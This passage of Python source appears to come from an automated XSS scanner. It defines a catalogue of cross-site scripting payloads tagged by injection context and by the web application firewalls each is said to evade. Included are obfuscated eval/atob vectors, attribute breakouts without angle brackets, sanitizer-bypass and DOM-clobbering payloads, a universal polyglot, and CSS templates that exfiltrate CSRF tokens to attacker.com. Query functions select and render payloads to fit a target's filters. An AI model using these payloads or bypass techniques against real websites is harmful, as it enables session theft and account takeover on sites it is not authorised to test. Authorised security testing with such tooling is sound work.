            bypasses_wafs=["aws_waf", "imperva", "cloudflare"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_js_eval_atob_obfuscation",
            name="WAF Bypass via Dynamic Base64 / atob Decryption",
            template="<img src=x onerror=\"window['ev'+'al'](window['at'+'ob']('X19YU1NfXygne3tUT0tFTn19Jyk='))\">",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Constructs eval and atob dynamically via string concatenation to evade AST and keyword sniffers.",
            tags=["waf_evasion", "js_obfuscation", "atob"],
            bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva", "modsecurity"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_regex_source_quoteless",
            name="Quoteless Execution via RegExp Source Property",
            template="<svg onload=__XSS__(/{{TOKEN}}/.source)>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
            description="Executes without single quotes, double quotes, or backticks by utilizing RegExp literal .source extraction to satisfy callback token requirements.",
            tags=["waf_evasion", "quoteless", "regex_source"],
            bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva", "f5_big_ip"],
            blocked_chars_tolerated={"'", '"', "`"},
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_in_tag_autofocus_no_brackets",
            name="Attribute Breakout without Angle Brackets via Autofocus",
            template='" onfocus=__XSS__(\'{{TOKEN}}\') autofocus="',
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.ATTR_QUOTED_DOUBLE],
            description="Achieves zero-interaction reflected execution inside double-quoted attributes without angle brackets < or >.",
            tags=["waf_evasion", "bracketless", "autofocus", "event_injection"],
            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf", "imperva"],
            blocked_chars_tolerated={"<", ">"},
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_in_tag_autofocus_sq_no_brackets",
            name="Single-Quoted Attribute Breakout without Angle Brackets via Autofocus",
            template="' onfocus=__XSS__('{{TOKEN}}') autofocus='",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.ATTR_QUOTED_SINGLE],
            description="Achieves zero-interaction execution in single-quoted attribute without angle brackets.",
            tags=["waf_evasion", "bracketless", "autofocus", "event_injection"],
            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf", "imperva"],
            blocked_chars_tolerated={"<", ">"},
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_details_ontoggle_autotrigger",
            name="WAF Evasion via Details Ontoggle Self-Trigger",
            template="<details open ontoggle=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Evades WAFs that inspect script/img/svg elements by leveraging the HTML5 details open ontoggle event.",
            tags=["waf_evasion", "details_tag", "ontoggle", "modern"],
            bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_script_close_js_string_breakout",
            name="Script Tag Close Breakout from Encapsulated JS String",
            template="</script><svg onload=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.JS_STRING_DOUBLE, InjectionContext.JS_STRING_SINGLE, InjectionContext.JS_TEMPLATE_LITERAL],
            description="Terminates the script parser mode directly, defeating filters that sanitize internal JS quotes or escape backslashes.",
            tags=["waf_evasion", "script_close", "context_breaking"],
            bypasses_wafs=["cloudflare", "akamai", "aws_waf"],
            blocked_chars_tolerated={"'", '"', ";", "\\"},
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="waf_svg_animate_onbegin",
            name="SVG Animate OnBegin Execution",
            template='<svg><animate attributeName="x" dur="1s" onbegin=__XSS__(\'{{TOKEN}}\')>',
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
            description="SMIL SVG animation trigger event onbegin bypassing tag and attribute event blocklists.",
            tags=["waf_evasion", "svg_smil", "onbegin", "pdf_intel"],
            bypasses_wafs=["cloudflare", "akamai", "imperva", "modsecurity"],
            cvss_score=8.1,
        ),
        PayloadEntry(
            id="waf_marquee_onstart",
            name="Marquee OnStart Self-Executing Vector",
            template="<marquee onstart=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="HTML marquee element onstart event triggering immediately upon render without user interaction.",
            tags=["waf_evasion", "marquee", "onstart", "pdf_intel"],
            bypasses_wafs=["aws_waf", "cloudflare", "imperva"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="waf_audio_src_onerror",
            name="Audio Element OnError Vector",
            template="<audio src=x onerror=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="HTML5 audio media error event handler evading image/script specific WAF signatures.",
            tags=["waf_evasion", "audio_tag", "onerror", "pdf_intel"],
            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="waf_blind_css_token_exfil",
            name="Blind CSS Attribute Selector Exfiltration",
            template='input[name="csrf"][value^="{{TOKEN}}"]{background:url(//attacker.com/exfil?c={{TOKEN}})}',
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.CSS_PROPERTY],
            description="Data exfiltration via CSS attribute selectors evading strict CSP script-src (learned from Blind CSS Exfiltration slides).",
            tags=["waf_evasion", "css_exfil", "csp_bypass", "pdf_intel"],
            bypasses_wafs=["cloudflare", "akamai", "imperva"],
            cvss_score=7.5,
        ),

        # =========================================================================
        # 9. ADVANCED CONTEXT BREAKOUTS (ES6 TEMPLATES, JSON, CSS)
        # =========================================================================
        PayloadEntry(
            id="context_template_literal_interpolation",
            name="ES6 Template Literal Expression Injection",
            template="${__XSS__('{{TOKEN}}')}",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.JS_TEMPLATE_LITERAL],
            description="Directly executes inside ES6 backtick template string literal via standard string interpolation ${...}.",
            tags=["template_literal", "es6", "direct_exec"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="context_json_key_value_breakout",
            name="JSON String Context Breakout to Script Closure",
            template="\"}}</script><script>__XSS__('{{TOKEN}}')</script>",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.JSON_VALUE, InjectionContext.JSON_KEY],
            description="Breaks out of JSON object rendered inside a script block by closing parent script tag.</script>.",
            tags=["json_breakout", "script_closure"],
            cvss_score=8.0,
        ),
        PayloadEntry(
            id="context_css_url_javascript_injection",
            name="CSS Style Attribute URL JavaScript Injection",
            template="background-image:url('javascript:__XSS__(\\'{{TOKEN}}\\')')",
            category=XSSCategory.REFLECTED,
            contexts=[InjectionContext.CSS_PROPERTY, InjectionContext.CSS_URL],
            description="Executes script via CSS background property URL pseudo-protocol in legacy and compatible engines.",
            tags=["css_xss", "url_scheme"],
            cvss_score=7.2,
        ),

        # =========================================================================
        # 10. BLEEDING-EDGE 2024-2025 VECTORS & CSS EXFILTRATION PRIMITIVES
        # =========================================================================
        PayloadEntry(
            id="import_maps_specifier_hijacking",
            name="Import Maps Bare Specifier Hijacking",
            template="<script type=\"importmap\">{\"imports\":{\"app\":\"data:text/javascript,__XSS__('{{TOKEN}}')\"}}</script>",
            category=XSSCategory.DOM_BASED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Remaps modern SPA module specifiers to execute arbitrary code when bare imports resolve.",
            tags=["import_maps", "modern_spa", "specifier_hijacking"],
            cvss_score=8.5,
        ),
        PayloadEntry(
            id="speculation_rules_prerender_hijacking",
            name="Speculation Rules API Prerender Hijacking",
            template="<script type=\"speculationrules\">{\"prerender\":[{\"source\":\"list\",\"urls\":[\"https://xssboss.invalid/prerender?token={{TOKEN}}\"]}]}</script>",
            category=XSSCategory.DOM_BASED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Leverages Speculation Rules API to force background prerender navigation and client state exfiltration.",
            tags=["speculation_rules", "prerender", "modern_browser"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="declarative_shadow_dom_bypass",
            name="Declarative Shadow DOM (DSD) Sanitizer Bypass",
            template="<template shadowrootmode=\"open\"><script>__XSS__('{{TOKEN}}')</script></template>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses HTML5 Declarative Shadow DOM <template shadowrootmode> to evade legacy DOM sanitizers and parse trees.",
            tags=["declarative_shadow_dom", "dsd", "sanitizer_bypass", "mxss"],
            cvss_score=8.8,
        ),
        PayloadEntry(
            id="css_attribute_exfiltration_canary",
            name="CSS Attribute-Selector Data Exfiltration Engine",
            template="<style>input[name=csrf_token][value^=\"a\"]{background:url('https://xssboss.invalid/exfil?char=a&token={{TOKEN}}')}</style>",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.CSS_PROPERTY],
            description="Exfiltrates DOM values character-by-character using CSS attribute selector probes without executing JavaScript.",
            tags=["css_exfil", "no_js", "attribute_selectors"],
            cvss_score=7.0,
        ),
        PayloadEntry(
            id="css_sequential_import_chain",
            name="CSS Sequential @import Exfiltration Probe",
            template="<style>@import url('https://xssboss.invalid/css_chain?step=1&token={{TOKEN}}');</style>",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Chains sequential CSS @import requests to dynamically exfiltrate sensitive values without script execution.",
            tags=["css_exfil", "import_chain", "no_js"],
            cvss_score=6.8,
        ),
        PayloadEntry(
            id="idn_punycode_domain_evasion",
            name="IDN Punycode Domain Bypass",
            template="<script src=\"https://xn--xss-9oa.invalid/xss.js?token={{TOKEN}}\"></script>",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses Internationalized Domain Names (IDN) with Punycode encoding to bypass regex domain blacklists.",
            tags=["idn", "punycode", "domain_evasion"],
            cvss_score=7.5,
        ),

        # =========================================================================
        # 11. ADVANCED PARSER QUIRKS, MULTI-BYTE & XML SINK PRIMITIVES (JACK MASA TAXONOMY)
        # =========================================================================
        PayloadEntry(
            id="comment_breakout_unicode_line_separator_2028",
            name="JS Single-Line Comment Breakout via Unicode Line Separator (U+2028)",
            template="//\u2028__XSS__('{{TOKEN}}');//",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.COMMENT_BLOCK, InjectionContext.JS_BLOCK, InjectionContext.JS_STRING_DOUBLE],
            description="Escapes single-line JavaScript comment without CR/LF by utilizing ECMAScript line terminator U+2028.",
            tags=["comment_breakout", "unicode_line_separator", "u2028", "js_parser"],
            blocked_chars_tolerated={"\r", "\n"},
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="comment_breakout_unicode_para_separator_2029",
            name="JS Single-Line Comment Breakout via Unicode Paragraph Separator (U+2029)",
            template="//\u2029__XSS__('{{TOKEN}}');//",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.COMMENT_BLOCK, InjectionContext.JS_BLOCK, InjectionContext.JS_STRING_DOUBLE],
            description="Escapes single-line JavaScript comment without CR/LF by utilizing ECMAScript paragraph terminator U+2029.",
            tags=["comment_breakout", "unicode_para_separator", "u2029", "js_parser"],
            blocked_chars_tolerated={"\r", "\n"},
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="multibyte_gbk_quote_eating_escape",
            name="Multi-byte GBK/Big5 Backslash Absorption Escape",
            template="%bb\"__XSS__('{{TOKEN}}');//",
            category=XSSCategory.WAF_EVASION,
            contexts=[InjectionContext.JS_STRING_DOUBLE, InjectionContext.ATTR_QUOTED_DOUBLE],
            description="Exploits multi-byte charset decoding where backend escaping (\\\" -> %5C%22) combines with %bb to form a valid multi-byte character (0xBB5C), leaving quote unescaped.",
            tags=["multibyte", "gbk", "backslash_eater", "encoding"],
            bypasses_wafs=["cloudflare", "modsecurity", "imperva"],
            cvss_score=8.1,
        ),
        PayloadEntry(
            id="attr_inline_event_named_entity_breakout",
            name="Attribute Inline Event Handler Named Entity Quote Breakout",
            template="&quot;),__XSS__('{{TOKEN}}')//",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.EVENT_HANDLER_ATTR, InjectionContext.ATTR_QUOTED_DOUBLE],
            description="HTML entity &quot; or &apos; resolves inside event handler attributes prior to JS interpretation, breaking out of quoted JS arguments.",
            tags=["entity_resolution", "inline_event", "attribute_breakout"],
            blocked_chars_tolerated={'\"', "'"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="attr_inline_event_numeric_entity_breakout",
            name="Attribute Inline Event Handler Numeric Entity Breakout",
            template="&#34;),__XSS__('{{TOKEN}}')//",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.EVENT_HANDLER_ATTR, InjectionContext.ATTR_QUOTED_DOUBLE],
            description="Decimal/hex entities (&#34;, &#x22;) resolve in HTML attribute values before script compilation.",
            tags=["entity_resolution", "numeric_entity", "inline_event"],
            blocked_chars_tolerated={'\"', "'"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="xml_svg_xlink_href_script_data_uri",
            name="SVG Script Namespace xlink:href Data URI Sink",
            template="<svg><script xlink:href=\"data:,__XSS__('{{TOKEN}}')\"></script></svg>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
            description="SVG XML script element executing data URI via xlink:href attribute in SVG namespace.",
            tags=["svg", "xlink", "namespace_sink", "data_uri"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="xml_mathml_xlink_href_javascript_uri",
            name="MathML Anchor xlink:href JavaScript Execution Sink",
            template="<math><a xlink:href=\"javascript:__XSS__('{{TOKEN}}')\">click</a></math>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.MATHML_NAMESPACE],
            description="MathML hyperlink element using XML xlink:href namespace to evaluate JavaScript URI.",
            tags=["mathml", "xlink", "javascript_uri"],
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="xml_svg_style_font_family_mutation",
            name="SVG Style Block Font-Family Parser Mutation",
            template="<svg><style>*{font-family:'<svg onload=__XSS__(\\'{{TOKEN}}\\')>';}</style></svg>",
            category=XSSCategory.MUTATION_XSS,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE, InjectionContext.CSS_PROPERTY],
            description="Exploits parser differential when CSS string delimiters in SVG style block are improperly sanitized by mXSS sanitizers.",
            tags=["mxss", "svg_style", "font_family"],
            cvss_score=8.2,
        ),
        PayloadEntry(
            id="dom_clobbering_form_window_name",
            name="DOM Clobbering Form window.name Clobbering",
            template="<form id=\"window\"><input name=\"name\" value=\"javascript:__XSS__('{{TOKEN}}')\"></form>",
            category=XSSCategory.DOM_CLOBBERING,
            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
            description="Clobbers global window.name or document.name reference using named form and input elements.",
            tags=["dom_clobbering", "window_name", "form_clobber"],
            cvss_score=7.8,
        ),
        PayloadEntry(
            id="html_token_delimiter_formfeed_vertical_tab",
            name="HTML Token Separator Evasion via Form Feed and Vertical Tab",
            template="<img\x0csrc=x\x0conerror=__XSS__('{{TOKEN}}')>",
            category=XSSCategory.CHAR_RESTRICTED,
            contexts=[InjectionContext.HTML_TEXT],
            description="Uses HTML5 whitespace token separator Form Feed (0x0C) or Vertical Tab (0x0B) to bypass space-only filters.",
            tags=["char_restricted", "form_feed", "token_separator", "spaceless"],
            blocked_chars_tolerated={" ", "\t"},
            cvss_score=7.5,
        ),
        PayloadEntry(
            id="polyglot_somdev_multi_context",
            name="Somdev Multi-Context Universal XSS Polyglot",
            template="%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ __XSS__('{{TOKEN}}')//\">",
            category=XSSCategory.WAF_EVASION,
            contexts=[
                InjectionContext.HTML_TEXT,
                InjectionContext.ATTR_QUOTED_DOUBLE,
                InjectionContext.ATTR_QUOTED_SINGLE,
                InjectionContext.JS_STRING_DOUBLE,
                InjectionContext.JS_STRING_SINGLE,
                InjectionContext.JS_TEMPLATE_LITERAL,
                InjectionContext.COMMENT_BLOCK,
                InjectionContext.URL_HREF,
                InjectionContext.URL_SRC,
                InjectionContext.RICH_TEXT_HTML,
            ],
            description="Somdev Sangwan (@s0md3v) multi-context polyglot breaking HTML body, attributes, RCDATA elements (textarea, style, script), quotes, backticks, and comments.",
            tags=["polyglot", "universal", "multi_context", "rcdata_breakout", "somdev"],
            bypasses_wafs=["cloudflare", "aws_waf", "imperva", "modsecurity"],
            cvss_score=8.5,
        ),
    ]

    @classmethod
    def get_all_payloads(cls) -> List[PayloadEntry]:
        """Return all registered payload entries in the knowledge base."""
        return cls.ENTRIES

    @classmethod
    def get_by_category(cls, category: XSSCategory) -> List[PayloadEntry]:
        """Filter payloads by their fundamental vulnerability category."""
        return [p for p in cls.ENTRIES if p.category == category]

    @classmethod
    def get_by_context(cls, context: InjectionContext) -> List[PayloadEntry]:
        """Filter payloads applicable to a specific injection context."""
        return [p for p in cls.ENTRIES if context in p.contexts]

    @classmethod
    def get_by_framework(cls, framework_name: str) -> List[PayloadEntry]:
        """Filter payloads matching a specific client-side framework."""
        target = framework_name.lower().strip()
        return [p for p in cls.ENTRIES if any(target in f.lower() for f in p.frameworks)]

    @classmethod
    def get_by_waf(cls, waf_name: str) -> List[PayloadEntry]:
        """Filter payloads designed to bypass a specific Web Application Firewall."""
        target = waf_name.lower().strip()
        return [p for p in cls.ENTRIES if any(target in w.lower() for w in p.bypasses_wafs)]

    @classmethod
    def find_matching_payloads(
        cls,
        context: Optional[InjectionContext] = None,
        category: Optional[XSSCategory] = None,
        framework: Optional[str] = None,
        waf: Optional[str] = None,
        blocked_characters: Optional[Set[str]] = None,
        tag: Optional[str] = None,
    ) -> List[PayloadEntry]:
        """
        Intelligent multi-criteria query engine for finding the most effective
        payloads based on real-time target constraints.
        """
        results = cls.ENTRIES

        if category:
            results = [p for p in results if p.category == category]

        if context:
            results = [p for p in results if context in p.contexts]

        if framework:
            fw_lower = framework.lower().strip()
            results = [p for p in results if any(fw_lower in f.lower() for f in p.frameworks)]

        if waf:
            waf_lower = waf.lower().strip()
            results = [p for p in results if any(waf_lower in w.lower() for w in p.bypasses_wafs)]

        if tag:
            tag_lower = tag.lower().strip()
            results = [p for p in results if any(tag_lower in t.lower() for t in p.tags)]

        if blocked_characters:
            clean_results = []
            for p in results:
                has_hard_blocked = False
                for char in blocked_characters:
                    raw_constraint = str(char)
                    if len(raw_constraint) == 1:
                        present = raw_constraint in p.template
                    else:
                        present = raw_constraint.lower() in p.template.lower()
                    if present and raw_constraint not in p.blocked_chars_tolerated:
                        has_hard_blocked = True
                        break
                if not has_hard_blocked:
                    clean_results.append(p)
            results = clean_results

        return results

    @classmethod
    def render_payload(cls, entry_id_or_template: str, token: str, callback_name: str = "__XSS__") -> str:
        """Render payload template with the actual oracle token and callback function."""
        entry = next((p for p in cls.ENTRIES if p.id == entry_id_or_template), None)
        template = entry.template if entry else entry_id_or_template

        rendered = template.replace("{{TOKEN}}", token)
        if callback_name != "__XSS__":
            rendered = rendered.replace("__XSS__", callback_name)
        return rendered

    @classmethod
    def get_context_payloads(
        cls,
        context_type: Any,
        filter_profile: Optional[Dict[str, Any]] = None,
        token: str = "XSSBOSS",
        limit: int = 25
    ) -> List[str]:
        """Fetch and render payloads tailored to the given context and filter profile."""
        ctx_str = getattr(context_type, "value", str(context_type))
        blocked_chars = set()
        blocked_keywords = []
        if filter_profile:
            if isinstance(filter_profile, dict):
                raw_tokens = filter_profile.get("blocked_tokens", [])
                raw_chars = filter_profile.get("blocked_chars", [])
            else:
                raw_tokens = getattr(filter_profile, "blocked_tokens", []) or []
                raw_chars = getattr(filter_profile, "blocked_chars", []) or []
            blocked_chars = set(raw_tokens) | set(raw_chars)
            blocked_keywords = [str(k).lower() for k in raw_tokens if len(str(k)) > 1]

        # Map context string to InjectionContext
        target_ctx = None
        for ic in InjectionContext:
            if ic.value.lower() in ctx_str.lower() or ctx_str.lower() in ic.value.lower():
                target_ctx = ic
                break

        matching = cls.find_matching_payloads(
            context=target_ctx,
            blocked_characters=blocked_chars
        )

        if not matching:
            matching = cls.find_matching_payloads(blocked_characters=blocked_chars)

        rendered = [cls.render_payload(p.template, token) for p in matching[:limit]]

        # Quote adaptation
        sq_ok = "'" not in blocked_chars
        dq_ok = '"' not in blocked_chars
        bt_ok = '`' not in blocked_chars
        brackets_ok = "<" not in blocked_chars and ">" not in blocked_chars

        arg = f'"{token}"' if dq_ok else (f"'{token}'" if sq_ok else (f"`{token}`" if bt_ok else "1"))
        fn = "confirm" if "alert" in blocked_keywords else ("prompt" if "alert" in blocked_keywords else "alert")

        candidates = []
        if "ATTR_UNQUOTED" in ctx_str.upper():
            if dq_ok or sq_ok:
                candidates.append(f"x tabindex=0 autofocus onfocus={fn}({arg})")
        elif "ATTR" in ctx_str:
            if dq_ok:
                candidates.append(f'" onfocus={fn}({arg}) autofocus="')
            if sq_ok:
                candidates.append(f"' onfocus={fn}({arg}) autofocus='")
            if brackets_ok:
                candidates.extend([
                    f'"><svg onload={fn}({arg})>',
                    f'"><img src=x onerror={fn}({arg})>',
                ])
        elif "JS" in ctx_str:
            if brackets_ok:
                candidates.extend([
                    f'</script><svg onload={fn}({arg})>',
                    f'</script><img src=x onerror={fn}({arg})>',
                ])
            if dq_ok:
                candidates.append(f'";{fn}({arg});//')
            if sq_ok:
                candidates.append(f"';{fn}({arg});//")
        elif "COMMENT" in ctx_str:
            if brackets_ok:
                candidates.extend([
                    f'--><svg onload={fn}({arg})>',
                    f'--><img src=x onerror={fn}({arg})>',
                    f'--><details open ontoggle={fn}({arg})>',
                ])
        elif "CSS" in ctx_str or "STYLE" in ctx_str:
            if brackets_ok:
                candidates.extend([
                    f'</style><svg onload={fn}({arg})>',
                    f'</style><img src=x onerror={fn}({arg})>',
                ])
        else:
            if brackets_ok:
                candidates.extend([
                    f'<svg onload={fn}({arg})>',
                    f'<img src=x onerror={fn}({arg})>',
                    f'<details open ontoggle={fn}({arg})>',
                ])

        rendered = candidates + rendered

        # Filter out hard blocked characters and keywords
        clean_rendered = []
        for r in rendered:
            if any(bc in r for bc in blocked_chars if len(bc) == 1):
                continue
            r_lower = r.lower()
            if any(kw in r_lower for kw in blocked_keywords):
                continue
            clean_rendered.append(r)

        return clean_rendered[:limit]

    @classmethod
    def get_summary_statistics(cls) -> Dict[str, Any]:
        """Get structural statistics of the knowledge base."""
        return {
            "total_payloads": len(cls.ENTRIES),
            "categories": {cat.value: len(cls.get_by_category(cat)) for cat in XSSCategory},
            "frameworks_supported": sorted(list({f for p in cls.ENTRIES for f in p.frameworks if f})),
            "wafs_targeted": sorted(list({w for p in cls.ENTRIES for w in p.bypasses_wafs if w})),
            "contexts_covered": [ctx.value for ctx in InjectionContext],
        }
